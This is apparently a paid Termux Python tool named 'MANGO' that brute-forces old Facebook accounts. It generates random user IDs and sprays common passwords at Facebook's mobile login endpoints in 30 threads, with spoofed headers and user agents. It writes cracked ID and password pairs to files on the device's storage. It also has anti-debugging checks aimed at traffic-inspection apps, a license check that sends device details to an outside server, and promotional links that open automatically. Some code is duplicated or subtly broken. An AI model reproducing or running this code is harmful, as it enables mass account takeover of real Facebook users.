
# Decode By DEEP-XD         
import lzma
import zlib
import codecs
import base64
_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));
import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import platform
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime
import os
import time
import os
import time


import os
import time

# WhatsApp Channel Section
channel_link = "https://whatsapp.com/channel/0029VbDS2XiKLaHtfgmw7t2v"
os.system(f"echo '{channel_link}' | termux-clipboard-set 2>/dev/null")
print(" \x1b[1;32m[+] WhatsApp Channel Link Copied to Clipboard!")
print(" \x1b[1;36m[*] Opening WhatsApp Channel...")
os.system(f"termux-open-url '{channel_link}'")

time.sleep(3)

# YouTube Channel Section (Fixed URL & Deep Linking)
yt_handle = "@fcrtech3697"
yt_link = f"https://www.youtube.com/{yt_handle}/"

print(" \x1b[1;32m[+] Opening YouTube Channel... Please Subscribe!")

# Try opening in YouTube App directly, fallback to Browser URL
yt_cmd = f"am start -a android.intent.action.VIEW -d '{yt_link}' >/dev/null 2>&1 || termux-open-url '{yt_link}'"
os.system(yt_cmd)

time.sleep(2)

# ===== IMPORTS =====
import os
import requests
import platform
import uuid
import time
import sys

# ===== LICENSE SYSTEM =====
LICENSE_SERVER = "https://ripon-mango-server.onrender.com/check-key"
APP_ID = "RIPON-MANGO"
KEY_FILE = os.path.expanduser("~/.mango_key.txt")
whatsapp_number = "8801755077702"

def get_hwid():
    hwid_file = os.path.expanduser("~/.mango_hwid.txt")

    try:
        if os.path.exists(hwid_file):
            with open(hwid_file, "r") as f:
                saved_hwid = f.read().strip()

            if saved_hwid:
                return saved_hwid

        # First run: create a stable local HWID
        import secrets
        new_hwid = str(secrets.randbits(63))

        with open(hwid_file, "w") as f:
            f.write(new_hwid)

        return new_hwid

    except Exception:
        return "MANGO-" + str(abs(hash(os.path.expanduser("~"))))


def get_device_model():
    try:
        brand = os.popen("getprop ro.product.brand").read().strip()
        model = os.popen("getprop ro.product.model").read().strip()

        if brand and model:
            return f"{brand} {model}"
        return model or brand or platform.machine()

    except Exception:
        return platform.machine()


def get_android_version():
    try:
        version = os.popen("getprop ro.build.version.release").read().strip()
        return version or "Unknown"
    except Exception:
        return "Unknown"


def get_live_version():
    return "1.0.0"


from datetime import datetime

def calculate_time_left(expiry_str):
    if not expiry_str or expiry_str.lower() == "lifetime":
        return "Lifetime"

    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
        now = datetime.now()

        remaining = expiry - now

        if remaining.total_seconds() <= 0:
            return "Expired"

        days = remaining.days
        hours, remainder = divmod(remaining.seconds, 3600)
        minutes, _ = divmod(remainder, 60)

        return f"{days}d {hours}h {minutes}m"

    except Exception:
        return str(expiry_str)


# ===== WHATSAPP GROUP =====
WHATSAPP_GROUP = "https://chat.whatsapp.com/GtwdMJlOG5OAdweFSZ5dmV"

def open_whatsapp(customer_name):
    try:
        os.system(
            f'am start -a android.intent.action.VIEW -d "{WHATSAPP_GROUP}"'
        )
    except Exception as e:
        print(f"[×] WhatsApp error: {e}")


# ===== LICENSE CHECK =====

def check_key():
    LICENSE_SERVER = "https://ripon-mango-server.onrender.com/check-key"

    saved_key_files = [
    KEY_FILE
]

    user_hwid = get_hwid()
    user_key = None
    key_data = None

    def verify_key(key):
        payload = {
            "key": key.strip().upper(),
            "app_id": "RIPON-MANGO",
            "hwid": user_hwid,
            "device_model": get_device_model(),
            "android_version": get_android_version(),
            "app_version": get_live_version()
        }

        try:
            response = response = None
            last_error = None
            for attempt in range(1, 4):
                try:
                    response = requests.post(
                        LICENSE_SERVER,
                        json=payload,
                        timeout=(10, 30)
                    )
                    if response.status_code == 403:
                        try:
                            error_data = response.json()
                            return None, error_data.get(
                                "message",
                                "License denied."
                            )
                        except Exception:
                            return None, "License denied by server."
                    if response.status_code >= 500 and attempt < 3:
                        time.sleep(2 * attempt)
                        continue
                    response.raise_for_status()
                    break
                except (requests.exceptions.Timeout,
                        requests.exceptions.ConnectionError) as exc:
                    last_error = exc
                    if attempt < 3:
                        print(f"[!] Server/network retry {attempt}/2...")
                        time.sleep(2 * attempt)
                        continue
                    raise
            if response is None:
                raise last_error or RuntimeError("License server did not respond")

            try:
                result = response.json()
            except Exception:
                return None, "Invalid server response."

            if response.status_code == 200 and result.get("ok") is True:
                return result, None

            return None, result.get(
                "message",
                "License verification failed."
            )

        except requests.exceptions.RequestException as e:
            return None, f"Connection error: {e}"

    for path in saved_key_files:
        if os.path.exists(path):
            try:
                with open(path, "r") as f:
                    saved_key = f.read().strip().upper()

                if saved_key:
                    result, error = verify_key(saved_key)

                    if result:
                        user_key = saved_key
                        key_data = result
                        break
                    else:
                        print(f"\n[×] Saved key verification failed: {error}")
            except Exception:
                pass

    if not key_data:
        for path in saved_key_files:
            if os.path.exists(path):
                try:
                    os.remove(path)
                except Exception:
                    pass

        os.system("clear")

        print("\n\033[1;33m[!] ACCESS DENIED\033[0m")
        print("\033[1;33mTHIS TOOL IS TOTALLY PAID!\033[0m")

        customer_name = input(
            "\033[1;33m[?] Enter Your Name: \033[0m"
        ).strip().upper()

        if not customer_name:
            customer_name = "USER"

        print(
            "\n\033[1;32m[•] Opening WhatsApp to request paid key...\033[0m"
        )

        time.sleep(1)
        open_whatsapp(customer_name)

        user_key = input(
            "\n\033[1;36m[?] Enter Your Paid Key: \033[0m"
        ).strip().upper()

        if not user_key:
            print(
                "\n\033[1;31m[×] Key cannot be empty.\033[0m"
            )
            time.sleep(2)
            sys.exit()

        result, error = verify_key(user_key)

        if not result:
            print(
                f"\n\033[1;31m[×] {error}\033[0m"
            )
            time.sleep(2)
            sys.exit()

        key_data = result

        for path in saved_key_files:
            try:
                with open(path, "w") as f:
                    f.write(user_key)
            except Exception:
                pass

    try:
        record_user_daily_usage(user_key)
    except Exception:
        pass

    return (
        key_data.get("name", "USER"),
        user_key,
        key_data.get("expiry", "Lifetime")
    )

def calculate_time_left(expiry_str):
    if not expiry_str or expiry_str.lower() == "lifetime":
        return "Lifetime"

    try:
        expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
        now = datetime.now()
        remaining = expiry - now

        if remaining.total_seconds() <= 0:
            return "Expired"

        days = remaining.days
        hours, remainder = divmod(remaining.seconds, 3600)
        minutes, _ = divmod(remainder, 60)

        return f"{days}d {hours}h {minutes}m"

    except Exception:
        return str(expiry_str)


def hold_screen_10_seconds():
    print()
    print("[*] Starting in 10 seconds...")

    for i in range(10, 0, -1):
        print(
            f"\r[*] Starting in {i} seconds...",
            end="",
            flush=True
        )
        time.sleep(1)

    print()


def display_welcome_banner(user_name, user_key, remaining_time):
    print()
    print("=" * 45)
    print("          ❤️ WELCOME ❤️ RIPON FCR")
    print("=" * 45)
    print(f"[+] Name   : {user_name}")
    print(f"[+] Key    : {user_key}")
    print(f"[+] Expiry : {remaining_time}")
    print("=" * 45)


if __name__ == "__main__":
    result = check_key()

    if result:
        user_name, user_key, expiry_str = result
        remaining_time = calculate_time_left(expiry_str)

        display_welcome_banner(
            user_name,
            user_key,
            remaining_time
        )

        hold_screen_10_seconds()

        print(
            "\033[1;32m"
            "[✓] Main Tool Started Successfully!"
            "\033[0m"
        )

# Initial setup and promotion
os.system('clear')
print(' \x1b[38;5;46mMANGO SERVER LOADING....')

os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip install httpx beautifulsoup4')
print('loading Modules ...\n')
os.system('clear')

# --- Anti-tampering and Security Checks ---
try:
    api_body = open(api.__file__, 'r').read()
    models_body = open(models.__file__, 'r').read()
    session_body = open(sessions.__file__, 'r').read()
    word_list = ['print', 'lambda', 'zlib.decompress']
    for word in word_list:
        if word in api_body or word in models_body or word in session_body:
            exit()
except:
    pass


class sec:
    def __init__(self):
        self.__module__ = __name__
        self.__qualname__ = 'sec'
        paths = [
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/sessions.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/api.py',
            '/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/models.py'
        ]
        for path in paths:
            if 'print' in open(path, 'r').read():
                self.fuck()
        if os.path.exists('/storage/emulated/0/x8zs/app_icon/com.guoshi.httpcanary.png'):
            self.fuck()
        if os.path.exists('/storage/emulated/0/Android/data/com.guoshi.httpcanary'):
            self.fuck()

    def fuck(self):
        print(' \x1b[1;32m Congratulations ! ')
        self.linex()
        exit()

    def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module} > /dev/null 2>&1')

import requests
from requests.exceptions import ConnectionError

requests.urllib3.disable_warnings()

def linex(self):
        print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


# Global variables
method = []
oks = []
cps = []
loop = 0
user = []

# Color codes for terminal output
X = '\x1b[1;37m'
rad = '\x1b[38;5;196m'
G = '\x1b[38;5;46m'
Y = '\x1b[38;5;220m'
PP = '\x1b[38;5;203m'
RR = '\x1b[38;5;196m'
GS = '\x1b[38;5;40m'
W = '\x1b[1;37m'


def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])


def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

# Set window title
sys.stdout.write('\x1b]2;𓆩【MANGO】𓆪 \x07')
# ==========================================
# 👑 REAL BRANDING BANNER (SCREENSHOT STYLE) 👑
# ==========================================
def show_branding():
    if 'win' in sys.platform:
        os.system('cls')
    else:
        os.system('clear')
    
    #current_version = get_live_version()
    
    print("""\033[1;32m
╔═════════════════════════════════════════════════╗
║ ███╗   ███╗ █████╗ ███╗   ██╗ ██████╗  ██████╗  ║
║ ████╗ ████║██╔══██╗████╗  ██║██╔════╝ ██╔═══██╗ ║
║ ██╔████╔██║███████║██╔██╗ ██║██║  ███╗██║   ██║ ║
║ ██║╚██╔╝██║██╔══██║██║╚██╗██║██║   ██║██║   ██║ ║
║ ██║ ╚═╝ ██║██║  ██║██║ ╚████║╚██████╔╝╚██████╔╝ ║
║ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝  ║
║        💞𝐅𝐂𝐑💞𝐑𝐈𝐏𝐎𝐍💞		  		║
╚═════════════════════════════════════════════════╝\033[1;97m""")
    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mOWNER      \x1b[38;5;46m:  \033[1;97m𝐑𝐈𝐏𝐎𝐍 𝐅𝐂𝐑")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97mADRESS     \x1b[38;5;46m:  \033[1;97mRAJSAHI🥭CHAPAI NAWABGANJ🥭")
    print("\x1b[38;5;46m[\033[1;97m=\x1b[38;5;46m] \033[1;97m	 🥭 𝐈𝐓'𝐒 𝐎𝐔𝐑 𝐌𝐀𝐍𝐆𝐎 𝐂𝐈𝐓𝐘 🥭")

    print("\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m")

def ____banner____():
    show_branding()


# پرانے بینر کو اس نئے طریقے پر سیٹ کر دیا تاکہ نیچے پورا اسکرپٹ خود ہی فکس ہو جائے
def ____banner____():
    show_branding()

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'):
        	return '2009'
        if uid.startswith('100000000'):
        	return '2009'
        if uid.startswith('10000000'):
        	return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
        	return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')):
        	return '2010'
        if uid.startswith('100001'):
        	return '2010'
        if uid.startswith(('100002', '100003')):
        	return '2011'
        if uid.startswith('100004'):
        	return '2012'
        if uid.startswith(('100005', '100006')):
        	return '2013'
        if uid.startswith(('100007', '100008')):
        	return '2014'
        if uid.startswith('100009'):
        	return '2015'
        if uid.startswith('10001'):
        	return '2016'
        if uid.startswith('10002'):
        	return '2017'
        if uid.startswith('10003'):
        	return '2018'
        if uid.startswith('10004'):
        	return '2019'
        if uid.startswith('10005'):
        	return '2020'
        if uid.startswith('10006'):
        	return '2021'
        if uid.startswith('10009'):
        	return '2023'
        if uid.startswith(('10007', '10008')):
        	return '2022'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''


def clear():
    os.system('clear')


def linex():
    print('\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')


def main_menu():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mOLD CLONE')
    linex()
    __Jihad__ = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mCHOICE  {W}: {Y}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_clone()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()


def old_clone():
    ____banner____()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mALL SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97m100003/4 SERIES')
    linex()
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97m2009 series')
    linex()
    _input = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mCHOICE  {W}: {Y}")
    if _input in ('A', 'a', '01', '1'):
        old_One()
    elif _input in ('B', 'b', '02', '2'):
        old_Tow()
    elif _input in ('C', 'c', '03', '3'):
        old_Tree()
    else:
        print(f"\n[×]{rad} Choose Value Option... ")
        main_menu()


def old_One():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mOld Code {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m/033[1;97mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mSELECT {Y}:{G} ")
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mMETHOD 1')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mMETHOD 2')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\033[1;97mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tow():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mOLD CODE {Y}:{G} 2010-2014")
    ask = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mSELECT {Y}:{G} ")
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mMETHOD B')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tree():
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mOLD CODE {Y}:{G} 2009-2010")
    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mMethod B')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;97mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMANGO-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mMANGO\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/FUCK-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMANGO\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/FUCK-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)


def login_2(uid):
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMANGO-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mMANGO\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/FUCK-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMANGO\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/FUCK-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception as e:
            pass
    loop += 1

